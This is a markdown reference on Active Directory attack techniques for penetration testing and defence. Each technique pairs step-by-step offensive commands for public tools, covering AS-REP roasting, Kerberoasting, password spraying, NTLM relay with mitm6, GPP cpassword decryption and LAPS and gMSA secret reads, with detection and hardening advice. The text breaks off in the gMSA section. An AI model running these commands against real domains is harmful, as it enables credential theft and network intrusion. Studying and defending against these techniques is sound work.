# AD Bible — Active Directory Offensive TTP Reference

> **Purpose.** A full-treatment reference for every major Active Directory attack
> path. Each technique covers: the attack vector (what misconfiguration or condition
> makes it possible), how a penetration tester performs it step-by-step, real
> commands drawn from public tooling, and a Blue Team block — where the attack
> originates in your network, what to look for, and how to close the gap.
>
> Framing: this is a **defensive threat model**. The commands shown are the publicly
> documented, standard invocations of well-known security tools (Impacket,
> BloodHound, Rubeus, Certipy, PowerView, NetExec, mimikatz, Responder, etc.).
> Nothing here is novel offense. Use it for detection engineering, hardening,
> non-destructive post-run validation (MITRE ATT&CK / Atomic Red Team), and OSCP
> preparation.
>
> **Coverage map:** see companion file `AD_Bible_Delta_to_ADRecon.md` for the
> finding-ID ↔ technique table showing which `ad-recon-toolkit` findings surface
> each attack's enabling condition.

---

## Kill-chain model

| Phase | Section |
|---|---|
| 1 | Unauthenticated / external enumeration |
| 2 | Authenticated enumeration (low-priv user) |
| 3 | Credential access |
| 4 | Domain privilege escalation |
| 5 | Lateral movement |
| 6 | Domain dominance & persistence |
| 7 | Trusts & cross-forest |
| 8 | AD-adjacent infrastructure |
| 9 | Notable CVEs |
| 10 | Tooling glossary |
| 11 | Source index |

---

## 1. Unauthenticated / external enumeration

---

### 1.1 Host & service discovery

| | |
|---|---|
| **ATT&CK** | T1046 — Network Service Discovery |
| **Phase** | Unauthenticated |
| **Min priv** | None (network reach) |
| **Tools** | nmap, crackmapexec/netexec |

**Attack vector**
No credentials needed. DC services (88/Kerberos, 389/LDAP, 445/SMB, 3268/Global Catalog, 9389/AD Web Services) fingerprint the DC without any authentication.

**How the PTA performs it**
1. Identify the target subnet from DNS SOA records, BGP data, or scope documentation.
2. Port-scan for the DC service profile.
3. Confirm DC identity from the LDAP rootDSE `defaultNamingContext` (readable anonymously) or Kerberos realm in the AS-REQ error.
4. Note port 80/443 on DCs or member servers — likely AD CS web enrollment (`/certsrv`) or ADFS.

**Commands**
```bash
# DC fingerprint scan
nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,636,3268,3269,3389,5985,9389 <subnet>

# Confirm DC via anonymous LDAP rootDSE
ldapsearch -x -H ldap://<dc> -s base -b "" defaultNamingContext

# Quick DC list via DNS SRV
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
```

**Blue team**

**Origin** — External (pre-auth reconnaissance) or internal lateral discovery. Traffic originates from the attacker's host. On-net scans look like any monitoring tool; fingerprint via nmap timing/probe patterns.

**Detect** — Firewall/IDS alerts on sequential port sweeps. Event 5156 (Windows Filtering Platform permitted connection) volume spikes. DNS query volume for `_msdcs` SRV records from non-standard hosts.

**Close** — Segment DC services behind a management VLAN; block 88/389/445 from untrusted segments at the perimeter. Require VPN/jump-host for any admin connectivity. Monitor for unauthorized LDAP rootDSE queries.

---

### 1.2 SMB null sessions & anonymous RPC

| | |
|---|---|
| **ATT&CK** | T1135, T1069.002 |
| **Phase** | Unauthenticated |
| **Min priv** | None |
| **Tools** | enum4linux-ng, smbclient, rpcclient |

**Attack vector**
Older DCs or misconfigured servers allow null (anonymous) SMB sessions. Through RPC over SMB an unauthenticated caller can enumerate domain users, groups, shares, and password policy.

**How the PTA performs it**
1. Attempt a null session with `smbclient -L //<dc>/ -N`.
2. If successful, open an RPC session with `rpcclient -U "" -N <dc>`.
3. Run `enumdomusers`, `enumdomgroups`, `querydominfo` to pull user list, group list, and lockout threshold.
4. Feed the user list into password spraying or Kerberos enumeration.

**Commands**
```bash
# Full null-session enumeration
enum4linux-ng -A <dc>

# Manual RPC enumeration
rpcclient -U "" -N <dc>
  > enumdomusers
  > enumdomgroups
  > querydominfo
  > getdompwinfo

# Share listing
smbclient -L //<dc>/ -N
```

**Blue team**

**Origin** — Any host with SMB access to the DC. Anonymous sessions originate from a source with no valid domain credentials — often an initial foothold machine or an external host if SMB is exposed.

**Detect** — Event 4624 (logon type 3, null username). Event 4625 (failed anonymous logon attempt). Spike in `IPC$` share access from hosts without matching computer accounts.

**Close** — Set `RestrictAnonymous = 1` and `RestrictAnonymousSAM = 1` in `HKLM:\SYSTEM\CurrentControlSet\Control\Lsa` via GPO. Ensure `Network access: Do not allow anonymous enumeration of SAM accounts` and `...of shares` are enabled. Block unauthenticated RPC at the DC firewall.

---

### 1.3 RID cycling

| | |
|---|---|
| **ATT&CK** | T1087.002 |
| **Phase** | Unauthenticated |
| **Min priv** | None (if null sessions allowed) |
| **Tools** | lookupsid.py (Impacket), netexec |

**Attack vector**
Every domain object (user, group, computer) has a well-known RID pattern. By iterating RIDs 500–9999 over an anonymous or authenticated session, an attacker builds a full account list without LDAP access.

**How the PTA performs it**
1. Open null session or authenticated SMB to the DC.
2. Iterate RIDs from 500 upward via `lsarpc` `LsarLookupSids` calls.
3. Collect all returned `samAccountName` values; filter by type (user/group/computer).

**Commands**
```bash
# Unauthenticated (null session required)
lookupsid.py 'anonymous'@<dc>

# Authenticated
lookupsid.py 'CORP/user:pass'@<dc>

# NetExec equivalent
netexec smb <dc> -u '' -p '' --rid-brute
netexec smb <dc> -u user -p pass --rid-brute 10000
```

**Blue team**

**Origin** — Single host making rapid sequential `LsarLookupSids` calls to the DC over port 445. Pattern is distinctive: hundreds of RID lookups in seconds.

**Detect** — No default Windows event for individual SID lookups. Monitor via SMB traffic volume to DC (NetFlow/PCAP); IDS signatures for Impacket lookupsid user-agent. Security products with LDAP/RPC logging may surface the burst.

**Close** — Same controls as 1.2 (`RestrictAnonymous`). Enforce SMB signing so null sessions are harder to establish. Consider blocking direct SMB from workstations to DCs (route through a jump host).

---

### 1.4 LDAP anonymous bind

| | |
|---|---|
| **ATT&CK** | T1087.002 |
| **Phase** | Unauthenticated |
| **Min priv** | None |
| **Tools** | ldapsearch, windapsearch, ldapdomaindump |
| **ad-recon finding** | ADC-026 |

**Attack vector**
If `dsHeuristics` position 7 is `2`, any unauthenticated user can read the entire directory tree — all user, computer, group, and policy objects without credentials.

**How the PTA performs it**
1. Attempt an anonymous LDAP bind to confirm access.
2. If successful, dump the full directory: users (with `description`, `pwdLastSet`, UAC flags), computers, groups, GPO links, trusts.
3. Feed output into BloodHound or manual analysis.

**Commands**
```bash
# Test anonymous bind
ldapsearch -x -H ldap://<dc> -b "DC=corp,DC=local" "(objectClass=*)" dn

# Full user dump
ldapsearch -x -H ldap://<dc> -b "DC=corp,DC=local" "(objectClass=user)" \
  samAccountName userPrincipalName description memberOf userAccountControl pwdLastSet

# Tool-assisted
windapsearch --dc <dc> -d corp.local --users --full
```

**Blue team**

**Origin** — Any host with network access to TCP 389/636 on the DC. Particularly dangerous from external networks if LDAP is exposed.

**Detect** — Event 4625 (anonymous logon attempt if failed); monitor for LDAP connections where `authType` is SIMPLE with empty DN and password (Wireshark: `ldap.bindRequest.authentication.simple == ""`). No built-in Windows event for successful anonymous binds — requires network-layer visibility.

**Close** — Set `dsHeuristics` position 7 back to `0` or `1` via `CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration`. Verify with: `Get-ADObject "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,<ConfigDn>" -Properties dsHeuristics`. GPO: `Network access: Allow anonymous SID/Name translation = Disabled`.

---

### 1.5 DNS zone transfer & SRV enumeration

| | |
|---|---|
| **ATT&CK** | T1590.002 |
| **Phase** | Unauthenticated |
| **Min priv** | None |
| **Tools** | dig, dnsrecon, nslookup |
| **ad-recon finding** | DNS-008 |

**Attack vector**
Misconfigured DNS zones that permit AXFR (zone transfer) to any host expose the complete internal DNS record set — every server name, IP, and service record — without credentials.

**How the PTA performs it**
1. Query SRV records to identify DCs, GC, and KDC.
2. Attempt AXFR zone transfer.
3. If successful, dump all A/AAAA/CNAME/SRV records; look for CA servers (`pki.`), management hosts, WSUS/SCCM, legacy servers.

**Commands**
```bash
# SRV-based DC discovery
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
dig @<dc> _kerberos._tcp.dc._msdcs.corp.local SRV

# Zone transfer attempt
dig @<dc> corp.local AXFR
dnsrecon -d corp.local -t axfr -n <dc>
dnsrecon -d corp.local -t std       # standard enumeration without AXFR
```

**Blue team**

**Origin** — Any host; most dangerous from external resolvers if the DNS server is internet-facing.

**Detect** — DNS server debug logging (Event 6001–6004 in Microsoft-Windows-DNSServer/Analytical); AXFR requests appear as query type 252. Monitor for large DNS responses (>100 records) to a single client.

**Close** — Set zone transfer to `None` or restrict to specific secondary DNS server IPs in DNS Manager → Zone Properties → Zone Transfers. Use AD-integrated zones (stored in AD, no AXFR possible). Remove external DNS exposure.

---

### 1.6 Kerberos user enumeration (kerbrute)

| | |
|---|---|
| **ATT&CK** | T1589.001 |
| **Phase** | Unauthenticated |
| **Min priv** | None (network reach to port 88) |
| **Tools** | kerbrute |

**Attack vector**
The Kerberos AS-REQ response differs depending on whether the username exists: `KDC_ERR_PREAUTH_REQUIRED` (user exists, pre-auth enforced) vs `KDC_ERR_C_PRINCIPAL_UNKNOWN` (user doesn't exist). This allows silent username validation without authentication or account lockout (by default).

**How the PTA performs it**
1. Obtain a username wordlist (LinkedIn scraping, common names, leaked lists).
2. Submit AS-REQ for each username and filter by response code.
3. Valid usernames feed into password spraying or AS-REP roasting.

**Commands**
```bash
kerbrute userenum --dc <dc> -d corp.local users.txt
kerbrute userenum --dc <dc> -d corp.local /usr/share/seclists/Usernames/Names/names.txt
```

**Blue team**

**Origin** — External or internal host with direct access to TCP 88 on the DC. No SMB required — pure Kerberos traffic.

**Detect** — Event 4768 (Kerberos TGT request) with `0x6` result code (KDC_ERR_C_PRINCIPAL_UNKNOWN). A burst of 4768 events with result `0x6` from a single IP is a strong signal. Watch for mismatched client/IP combinations.

**Close** — No built-in Kerberos pre-auth lockout for username enumeration (by design). Mitigate with: IDS rules on 4768 `0x6` bursts; rate-limit Kerberos at the network layer from untrusted segments; audit account-name formats so wordlists are less effective.

---

### 1.7 AS-REP roasting without credentials

| | |
|---|---|
| **ATT&CK** | T1558.004 |
| **Phase** | Unauthenticated → Credential Access |
| **Min priv** | None (requires knowing valid usernames) |
| **Tools** | GetNPUsers.py, kerbrute, hashcat |
| **ad-recon finding** | ADC-004 |

**Attack vector**
Accounts with `DONT_REQ_PREAUTH` (UAC flag `0x400000`) set will return an encrypted AS-REP blob when asked — no password required. The blob is encrypted with the user's password hash and can be cracked offline.

**How the PTA performs it**
1. Obtain a user list (via kerbrute, null session, or provided scope).
2. Request AS-REP for each user without sending a pre-auth timestamp.
3. Collect returned AS-REP hashes; crack offline with hashcat mode 18200.

**Commands**
```bash
# Unauthenticated (requires user list)
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip <dc> -format hashcat

# Authenticated (finds DONT_REQ_PREAUTH accounts automatically)
GetNPUsers.py corp.local/user:pass -request -dc-ip <dc> -format hashcat

# Windows (Rubeus)
Rubeus.exe asreproast /nowrap

# Crack
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

**Blue team**

**Origin** — Any host. Unauthenticated variant requires prior username enumeration. Authenticated variant only requires a low-priv domain account.

**Detect** — Event 4768 with `EncryptionType 0x17` (RC4, etype 23) and no pre-auth (preauth type 0). Can detect the request even before cracking succeeds. Also flag accounts with `DONT_REQ_PREAUTH` in LDAP.

**Close** — Remove `DONT_REQ_PREAUTH` from all accounts. If a legacy application requires it, enforce strong (20+ char) passwords on those accounts and alert on any AS-REP request for them. Require AES Kerberos (`msDS-SupportedEncryptionTypes = 24`) to prevent RC4 AS-REP tickets.

---

## 2. Authenticated enumeration

---

### 2.1 BloodHound / SharpHound graph collection

| | |
|---|---|
| **ATT&CK** | T1069.002, T1087.002, T1482 |
| **Phase** | Authenticated enumeration |
| **Min priv** | Any valid domain user |
| **Tools** | SharpHound, bloodhound-python, BloodHound CE |

**Attack vector**
BloodHound ingests LDAP, SMB (net session/local admin), and RPC data, then uses graph theory to find all transitive attack paths from a low-priv account to Domain Admin. A single domain user can enumerate paths that would take days to find manually.

**How the PTA performs it**
1. Run SharpHound (Windows) or bloodhound-python (Linux) with the target domain and credentials.
2. Transfer the resulting ZIP/JSON files to the analysis host.
3. Import into BloodHound; query "Shortest paths to Domain Admins from owned principals."
4. Mark owned accounts (compromised credentials); find next-hop attack paths.

**Commands**
```bash
# Linux (no Windows required)
bloodhound-python -u user -p pass -d corp.local -ns <dc> -c All --zip

# Windows — run from domain-joined host or pass -ldapusername/-ldappassword
SharpHound.exe -c All --zipfilename bh.zip

# Specific collection methods
bloodhound-python -c DCOnly -u user -p pass -d corp.local -ns <dc>  # LDAP only, stealthier
```

**Blue team**

**Origin** — The host running SharpHound/bloodhound-python. Connects to all DCs (LDAP 389/636), and optionally enumerates sessions by connecting SMB (445) to every host in scope.

**Detect** — LDAP query volume: SharpHound issues hundreds of LDAP searches in rapid succession. Event 4662 (LDAP access on directory objects) burst. SMB connections to all hosts from a single source (session enumeration). Endpoint detection: `SharpHound.exe` process creation (Event 4688 + 4104 ScriptBlock logging for PS variant). Network: BloodHound-python generates distinctive LDAP filter patterns.

**Close** — Restrict net session enumeration: `Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options > Network access: Restrict clients allowed to make remote calls to SAM`. Audit LDAP query volume from non-admin accounts; monitor for `(samAccountType=805306368)` mass LDAP queries. Enable Advanced Audit → DS Access.

---

### 2.2 PowerView / LDAP attribute mining

| | |
|---|---|
| **ATT&CK** | T1087.002, T1069.002, T1482 |
| **Phase** | Authenticated enumeration |
| **Min priv** | Any valid domain user |
| **Tools** | PowerView, SharpView, ldapdomaindump, windapsearch |

**Attack vector**
Any authenticated user can read most LDAP attributes by default. PowerView wraps LDAP queries into PowerShell functions that surface delegation settings, ACLs, SPNs, GPO links, and group memberships in seconds.

**How the PTA performs it**
1. Import PowerView or load from a remote source (AMSI bypass first if needed).
2. Enumerate domain objects: users with SPNs (Kerberoast targets), computers with unconstrained delegation, ACL paths, trusts.
3. Find interesting attributes: accounts with `description` containing passwords, `adminCount=1` orphans, `sIDHistory` populated accounts.

**Commands**
```powershell
# Core enumeration
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname
Get-DomainComputer -Unconstrained | Select name, dnshostname
Get-DomainObject -SearchBase "CN=AdminSDHolder,CN=System,DC=corp,DC=local" | Select-Object -ExpandProperty ntsecuritydescriptor
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner" -and $_.SecurityIdentifier -notmatch "^S-1-5-21.*-5[0-9][0-9]$"}
Get-DomainTrust
Get-DomainGPO | Select displayname, gpcfilesyspath

# Attribute-level secrets hunting
Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description -match "pass|pwd|cred|secret|key"}
```

```bash
# Linux equivalent
ldapdomaindump -u 'corp\user' -p pass <dc> -o /tmp/dump
windapsearch -d corp.local -u user@corp.local -p pass --da --full
```

**Blue team**

**Origin** — Any domain-joined host or host with LDAP access and valid credentials. PowerView generates LDAP queries indistinguishable from normal admin tooling at the protocol level.

**Detect** — ScriptBlock logging (Event 4104) catches PowerView imports and function calls. AMSI should flag known PowerView signatures unless obfuscated. Mass LDAP enumeration pattern (hundreds of searches in seconds from a non-admin account) via network monitoring or LDAP diagnostic logging (enable via `15 Field Engineering` registry key).

**Close** — Enable ScriptBlock and Module logging via GPO. Deploy AMSI-enabled AV. Restrict LDAP query rights for sensitive attributes (ACL on AD objects for highly sensitive attributes like `msDS-KeyCredentialLink`, `msDS-ManagedPassword`). Audit accounts with broad ACL rights.

---

### 2.3 Share discovery & sensitive file hunting

| | |
|---|---|
| **ATT&CK** | T1135, T1039, T1552.001 |
| **Phase** | Authenticated enumeration |
| **Min priv** | Any valid domain user |
| **Tools** | netexec, smbmap, Snaffler, manspider |

**Attack vector**
File shares often contain plaintext credentials, scripts with hardcoded passwords, SSH keys, database connection strings, and configuration files. SYSVOL and NETLOGON are readable by all authenticated users and frequently contain credentials in scripts.

**How the PTA performs it**
1. Enumerate accessible shares across the subnet.
2. Filter for readable shares beyond standard `IPC$`/`NETLOGON`/`SYSVOL`.
3. Search file contents for credential patterns using Snaffler or manspider.
4. Review SYSVOL for logon scripts with plaintext credentials.

**Commands**
```bash
# Enumerate shares
netexec smb <subnet>/24 -u user -p pass --shares
smbmap -H <host> -u user -p pass -R          # recursive listing

# Hunt sensitive files
Snaffler.exe -s -o snaffler.log               # Windows
manspider <subnet>/24 -u user -p pass -t 20 -f \.xml \.conf \.ini \.bat \.ps1 -c pass password cred secret

# SYSVOL review
find //<dc>/SYSVOL -name "*.bat" -o -name "*.ps1" -o -name "*.xml" | xargs grep -i "pass\|pwd\|cred"
```

**Blue team**

**Origin** — Any domain-authenticated host scanning the subnet. Snaffler generates high-volume SMB tree-walk traffic. SYSVOL access is normal; content reading is not logged by default.

**Detect** — Monitor for bulk file reads across multiple shares from a single source (SMB audit events 5140/5145 with `Read` access at high volume). Alert on access to files matching `*.kdbx`, `*password*`, `*cred*` in monitored paths. Enable Object Access auditing on sensitive file shares.

**Close** — Audit share permissions quarterly; remove `Everyone`/`Authenticated Users` write access. Scan SYSVOL for hardcoded credentials (GPO-010 via Group3r). Apply least-privilege to file share ACLs. Move credentials to a secrets vault (LAPS, gMSA, CyberArk).

---

### 2.4 Secrets in AD attributes

| | |
|---|---|
| **ATT&CK** | T1552.004 |
| **Phase** | Authenticated enumeration |
| **Min priv** | Any valid domain user |
| **Tools** | PowerView, ldapsearch, ad-recon ADC-017 |
| **ad-recon finding** | ADC-017 |

**Attack vector**
Administrators frequently store passwords, SSH keys, and service account credentials in `description`, `info`, or `comment` AD attributes — either during provisioning or troubleshooting. These attributes are readable by any authenticated user.

**How the PTA performs it**
1. Query all user and computer objects for the three readable attributes.
2. Filter for strings matching password-like patterns.
3. Test any found credentials immediately.

**Commands**
```powershell
Get-DomainUser -Properties samaccountname,description,info | Where-Object {
    $_.description -match "pass|pwd|cred|secret|key|p@ss" -or
    $_.info -match "pass|pwd|cred|secret"
}
Get-DomainComputer -Properties name,description | Where-Object { $_.description -match "pass|pwd" }
```

```bash
ldapsearch -x -H ldap://<dc> -D "corp\user" -w pass -b "DC=corp,DC=local" \
  "(objectClass=user)" samAccountName description info | grep -A2 -i "pass\|cred\|pwd"
```

**Blue team**

**Origin** — No network activity required beyond an authenticated LDAP query. Any domain-authenticated session.

**Detect** — No real-time detection for LDAP attribute reads. Detect the credential itself being used from an unexpected host. Periodic audit of all `description`/`info`/`comment` attributes for password-pattern strings (what `ad-recon` ADC-017 does automatically).

**Close** — Run ADC-017 findings and clear any credentials from AD attributes immediately. Create a policy prohibiting storage of credentials in AD attributes. Train helpdesk/admins on LAPS and gMSA as the correct credential storage mechanisms.

---

## 3. Credential access

---

### 3.1 Kerberoasting

| | |
|---|---|
| **ATT&CK** | T1558.003 |
| **Phase** | Credential access |
| **Min priv** | Any valid domain user |
| **Tools** | GetUserSPNs.py, Rubeus, hashcat |
| **ad-recon findings** | ADC-005, ADC-035 |

**Attack vector**
Any authenticated user can request a Kerberos TGS ticket for any account that has a Service Principal Name (SPN) set. The ticket is encrypted with the service account's NTLM hash and can be cracked offline. User accounts (vs. computer accounts) with weak passwords are the primary target. RC4 encryption (`etype 23`) is weaker and cracks faster than AES — making `ADC-035` (RC4 allowed on domain) a force multiplier.

**How the PTA performs it**
1. Enumerate all enabled user accounts with SPNs (these are Kerberoast targets).
2. Request a TGS for each account; capture the encrypted ticket.
3. Crack offline targeting RC4 tickets first (if RC4 allowed), then AES.
4. Use cracked password to authenticate as the service account.

**Commands**
```bash
# Linux
GetUserSPNs.py corp.local/user:pass -request -dc-ip <dc> -outputfile kerberoast.hashes

# Filter for most crackable (RC4 only)
GetUserSPNs.py corp.local/user:pass -request -dc-ip <dc> -target-domain corp.local \
  | grep "\$krb5tgs\$23\$"

# Crack
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -r rules/d3ad0ne.rule
```

```powershell
# Windows
Rubeus.exe kerberoast /nowrap /format:hashcat /outfile:hashes.txt

# Target specific user
Rubeus.exe kerberoast /user:svc_sql /nowrap
```

**Blue team**

**Origin** — Any domain-authenticated host. Impacket generates TGS requests from Linux without joining the domain; Rubeus runs in-process on Windows.

**Detect** — Event 4769 (Kerberos service ticket request) with `EncryptionType 0x17` (RC4) or large burst of 4769 events from one source. Kerberoasting typically requests tickets for every SPN account in rapid succession — distinct from normal single-service requests. Alert on 4769 for accounts with `adminCount=1`.

**Close** — Enforce AES-only Kerberos (`msDS-SupportedEncryptionTypes = 24` on domain object — ADC-035). Require 30+ character, randomly generated passwords on all service accounts (LAPS, gMSA, or a PAM vault). Remove unnecessary SPNs; prefer gMSA which auto-rotates. Audit SPNs on `adminCount=1` accounts (ADC-005).

---

### 3.2 AS-REP roasting (authenticated)

*See §1.7 for the unauthenticated variant.*

| | |
|---|---|
| **ATT&CK** | T1558.004 |
| **Phase** | Credential access |
| **Min priv** | Any valid domain user |
| **ad-recon finding** | ADC-004 |

**Attack vector**
Same as §1.7 but authenticated enumeration finds the `DONT_REQ_PREAUTH` accounts automatically without needing a pre-supplied username list.

**Commands**
```bash
GetNPUsers.py corp.local/user:pass -request -dc-ip <dc> -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

```powershell
Rubeus.exe asreproast /nowrap /format:hashcat
```

**Blue team** — Same as §1.7. Additional note: once authenticated, the attacker can also use BloodHound to find these accounts automatically — `MATCH (u:User {dontreqpreauth: true}) RETURN u`.

---

### 3.3 Password spraying

| | |
|---|---|
| **ATT&CK** | T1110.003 |
| **Phase** | Credential access |
| **Min priv** | None (network reach to DC) |
| **Tools** | kerbrute, netexec, Spray |
| **ad-recon findings** | ADC-009, ADC-032 |

**Attack vector**
Testing one or two common passwords (e.g., `Season+Year!`, company name variations) against every account avoids lockout thresholds while exploiting weak password policies. Fine-grained password policies (PSO) can create different lockout thresholds per group — increasing attacker surface.

**How the PTA performs it**
1. Check the domain lockout threshold (typically 5–10 bad attempts) via anonymous or authenticated RPC.
2. Choose a candidate password: seasonal (`Spring2025!`), company name, `Welcome1`, default patterns.
3. Spray at `threshold - 2` attempts per account per window.
4. Wait one full lockout observation window between rounds; spray again with a new candidate.

**Commands**
```bash
# Kerberos-based (no SMB, less noisy)
kerbrute passwordspray --dc <dc> -d corp.local users.txt 'Spring2025!'

# SMB-based
netexec smb <dc> -u users.txt -p 'Spring2025!' --continue-on-success --no-bruteforce

# Check lockout policy first
netexec smb <dc> -u user -p pass --pass-pol
```

**Blue team**

**Origin** — Any host. Kerberos-based spraying targets port 88 only; SMB-based targets port 445. Low-and-slow spraying is nearly invisible in raw event counts.

**Detect** — Event 4625 (bad password) with `Status 0xC000006A` distributed across many accounts from one source. Also Event 4771 (Kerberos pre-auth failure). Look for `SubStatus 0xC000006A` (wrong password, account exists) vs `0xC0000064` (account not found). Pattern: one failure per account, many accounts, single source IP, slow rate.

**Close** — Set lockout threshold ≤ 5 invalid attempts; observation window ≥ 30 minutes (ADC-009, ADC-032). Require MFA for privileged accounts. Implement Azure AD Password Protection (leaked password lists) if applicable. Consider honeytoken accounts — any login attempt against them is an alert.

---

### 3.4 LLMNR / NBT-NS / mDNS poisoning + NTLM relay

| | |
|---|---|
| **ATT&CK** | T1557.001 |
| **Phase** | Credential access |
| **Min priv** | Network position (same broadcast domain) |
| **Tools** | Responder, ntlmrelayx, mitm6 |
| **ad-recon findings** | HOST-013, GPO-004, GPO-005, HOST-028, HOST-012, HOST-029 |

**Attack vector**
When a Windows host can't resolve a name via DNS, it falls back to LLMNR (224.0.0.252) and NBT-NS (broadcast) — both enabled by default. Any host on the same segment can respond and claim to be the target, receiving the client's NTLMv2 challenge-response. With SMB signing not required, these hashes can be relayed directly to other hosts without cracking. IPv6 (mitm6) adds a DHCPv6 coercion path even when LLMNR/NBT-NS are disabled.

**How the PTA performs it**
1. Run Responder to poison LLMNR/NBT-NS and capture NTLMv2 hashes.
2. Simultaneously run ntlmrelayx targeting hosts that don't require SMB signing.
3. (Advanced) Run mitm6 to inject a rogue DHCPv6 server and intercept IPv6 WPAD lookups, relaying those credentials to LDAP or SMB.

**Commands**
```bash
# Phase 1: Capture hashes (identify relay targets first)
# Find hosts without SMB signing
netexec smb <subnet>/24 --gen-relay-list targets.txt

# Phase 2a: Relay attack (no need to crack)
ntlmrelayx.py -tf targets.txt -smb2support                          # shell/SAM dump
ntlmrelayx.py -tf targets.txt -smb2support -i                       # interactive SMB shell
ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -l loot # LDAP relay

# Phase 2b: Hash capture for cracking (separate terminal)
responder -I eth0 -dwv

# mitm6 + LDAP relay (works even with LLMNR/NBT-NS disabled)
mitm6 -d corp.local &
ntlmrelayx.py -6 -t ldaps://<dc> --delegate-access --no-smb-server -wh attacker-wpad
```

**Blue team**

**Origin** — An attacker positioned on the same Layer 2 broadcast domain as victims. Requires local network access; usually triggered after initial foothold on any host in the segment.

**Detect** — Rogue LLMNR/NBT-NS responders: DNS events for names that resolve via LLMNR instead of DNS (no corresponding DNS query). mitm6: unexpected DHCPv6 ADVERTISE messages (Event 1001 in Microsoft-Windows-Dhcp-Client); monitor for `fe80::` gateway in IPv6 routing. NTLM relay: Event 4624 (successful logon) from a host that the source account doesn't normally access. Event 8004 in Microsoft-Windows-NTLM/Operational (if AUD-015 enabled).

**Close** — Disable LLMNR (GPO-004) and NBT-NS (GPO-005). Disable IPv6 on DCs if not needed (HOST-028). Require SMB signing on both server (HOST-012) and client (HOST-029). Require LDAP signing. Enable EPA (Extended Protection for Authentication). Configure WPAD DNS to resolve to a safe host.

---

### 3.5 GPP cpassword (MS14-025)

| | |
|---|---|
| **ATT&CK** | T1552.006 |
| **Phase** | Credential access |
| **Min priv** | Any valid domain user (SYSVOL read) |
| **Tools** | Get-GPPPassword, gpp-decrypt, netexec |
| **ad-recon finding** | GPO-001 |

**Attack vector**
Group Policy Preferences allowed administrators to set local account passwords via XML files stored in SYSVOL. Microsoft published the AES-256 decryption key in 2012 (MSDN documentation). Any domain user can read SYSVOL; therefore any domain user can decrypt these passwords. MS14-025 patched new storage but did NOT remove existing `cpassword` values.

**How the PTA performs it**
1. Search all XML files in `\\<domain>\SYSVOL` for the `cpassword` attribute.
2. Decrypt with the known static AES key.
3. The recovered password is typically a local Administrator password, valid across many hosts.

**Commands**
```bash
# Linux
netexec smb <dc> -u user -p pass -M gpp_password
netexec smb <dc> -u user -p pass -M gpp_autologin

# Manual search + decrypt
find /tmp/sysvol -name "*.xml" | xargs grep -l cpassword
gpp-decrypt <cpassword_value>
```

```powershell
# Windows
Get-GPPPassword                                     # PowerSploit
findstr /S /I cpassword "\\corp.local\sysvol\**\*.xml"
```

**Blue team**

**Origin** — Any domain host. SYSVOL is globally readable; the attack requires no elevated privileges.

**Detect** — No reliable runtime detection. The attack is LDAP-silent (file read only). File audit logs on SYSVOL (Object Access auditing on the Policies folder) would capture reads of the specific XML files, but volume makes this impractical. The finding is preventive: audit SYSVOL for `cpassword` existence.

**Close** — Run `Get-GPPPassword` yourself and remove any found values. Delete the offending GPO settings via GPMC (do not just delete the XML — the value may re-appear on next GPO edit). Apply MS14-025 patch (all modern Windows). Enforce LAPS for local admin password management.

---

### 3.6 LAPS password read

| | |
|---|---|
| **ATT&CK** | T1555 |
| **Phase** | Credential access |
| **Min priv** | Domain user with explicit LAPS read rights |
| **Tools** | netexec, PowerView, Get-LapsADPassword |
| **ad-recon findings** | ADC-020, ADC-034 |

**Attack vector**
LAPS stores the local Administrator password in `ms-Mcs-AdmPwd` (v1) or `msLAPS-Password` (v2). If an account is granted read access to these attributes — whether intentionally (helpdesk) or via over-broad ACL inheritance — they can retrieve the current local admin password for any enrolled computer.

**How the PTA performs it**
1. Enumerate which principals have `ReadProperty` on `ms-Mcs-AdmPwd` / `msLAPS-Password`.
2. If the compromised account is in scope, read the password directly.

**Commands**
```bash
netexec ldap <dc> -u user -p pass -M laps
netexec ldap <dc> -u user -p pass -M laps --options TARGET=server01
```

```powershell
Get-DomainObject -Identity server01 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
Get-LapsADPassword -Identity server01 -AsPlainText    # Windows LAPS v2 cmdlet
```

**Blue team**

**Origin** — Any host using the account with LAPS read rights. Purely an LDAP attribute read.

**Detect** — Event 4662 (directory object access) with GUID matching `ms-Mcs-AdmPwd` attribute if SACL is configured on computer objects. LAPS v2 includes its own audit logging (`Microsoft-Windows-LAPS/Operational`).

**Close** — Audit LAPS read rights quarterly (ADC-020). Grant read access only to specific admin groups (Tier-1 helpdesk for workstations; no one for DC LAPS). Use LAPS v2 with encrypted passwords. Enable Event 4662 auditing on computer objects for the LAPS attribute GUID.

---

### 3.7 gMSA password retrieval

| | |
|---|---|
| **ATT&CK** | T1555 |
| **Phase** | Credential access |
| **Min priv** | Domain user in PrincipalsAllowedToRetrieveManagedPassword |
| **Tools** | gMSADumper.py, DSInternals, GMSAPasswordReader |
| **ad-recon finding** | ADC-018 |

**Attack vector**
Group Managed Service Accounts store their password in `msDS-ManagedPassword` — readable only by principals listed in `msDS-GroupMSAMembership` / `PrincipalsAllowedToRetrieveManagedPassword`. If this group is over-broad (includes all domain computers, large groups, or compromised accounts), the NTLM hash of the gMSA can be retrieved and used for pass-the-hash.

**How the PTA performs it**
1. Enumerate gMSA accounts and their `PrincipalsAllowedToRetrieveManagedPassword`.
2. If the current account or a compromised machine account is in scope, read `msDS-ManagedPassword`.
3. Extract the NTLM hash from the blob; use for pass-the-hash or Kerberos.

**Commands**
```bash
# Linux
gMSADumper.py -u user -p pass -d corp.local

# Specific account
gMSADumper.py -u user -p pass -d corp.local -l 'svc_web$'
```

```powershell
# Windows — requires being the allowed principal or DA
